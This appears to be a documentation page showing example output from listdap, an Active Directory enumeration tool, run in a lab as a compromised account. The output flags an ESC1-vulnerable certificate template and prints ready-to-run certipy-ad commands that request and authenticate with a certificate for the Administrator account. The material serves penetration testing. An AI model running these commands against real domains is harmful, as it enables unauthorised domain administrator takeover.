# Example output

Running the **ADCS** module authenticated as the compromised `svc_ca` account against a lab DC. listdap flags **ESC1** on `Welcome-Template` (enrollable by the current identity) and prints a ready-to-run exploitation command filled from the enumerated data. *(Values anonymised.)*

![listdap ADCS run as svc_ca flagging ESC1](example-output.svg)

<details>
<summary>Plain-text version</summary>

```text
  ██╗     ██╗███████╗████████╗██████╗  █████╗ ██████╗ 
  ██║     ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗
  ██║     ██║███████╗   ██║   ██║  ██║███████║██████╔╝
  ██║     ██║╚════██║   ██║   ██║  ██║██╔══██║██╔═══╝ 
  ███████╗██║███████║   ██║   ██████╔╝██║  ██║██║     
  ╚══════╝╚═╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝     

[*] Connecting to 10.10.10.10:636 (LDAPS)

  ✔ Connected
    Target:  10.10.10.10:636
    Auth:  Kerberos (GSSAPI)
    Base DN:  DC=corp,DC=local

╔════════════════════════════════════════════════════════════╗
║                ADCS — CERTIFICATE SERVICES                 ║
╚════════════════════════════════════════════════════════════╝
[+] 1 Certificate Authority(ies) found
[*] Certificate Templates: 34 total

  ── CA: CORP-CA ──
    Hostname:  DC01.corp.local
    Published templates:  12
[+] ESC7: no non-privileged CA management rights on CORP-CA (via RRP)

  ── ESC1 — Enrollee Supplies Subject + Client Auth EKU ──
    Welcome-Template
          EKUs:  1.3.6.1.5.5.7.3.1, 1.3.6.1.5.5.7.3.2
          Enrollable by:  corp.local\svc_ca
          Exploit:  
        certipy-ad req -u 'svc_ca@corp.local' -p 'P@ssw0rd!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -template 'Welcome-Template' -upn 'Administrator@corp.local'
        certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10

  ── ESC1 (config) — not enrollable by current identity ──
    Subordinate Certification Authority
          Enrollment rights:  Domain Admins, Enterprise Admins
[*] Above templates match ESC1 config but the current identity cannot enroll — exploitable only after gaining one of the listed identities, or via ESC4 if you can edit the template ACL.

╔════════════════════════════════════════════════════════════╗
║                         QUICK WINS                         ║
╚════════════════════════════════════════════════════════════╝
  [CRITICAL] ESC1 — 1 vulnerable template(s)
         Allows requesting a certificate with an arbitrary SAN (e.g., Domain Admin UPN).
         Enrollable by a principal the current identity controls:
           - Welcome-Template  (enrollable by: corp.local\svc_ca)
               certipy-ad req -u 'svc_ca@corp.local' -p 'P@ssw0rd!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -template 'Welcome-Template' -upn 'Administrator@corp.local'
               certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

</details>
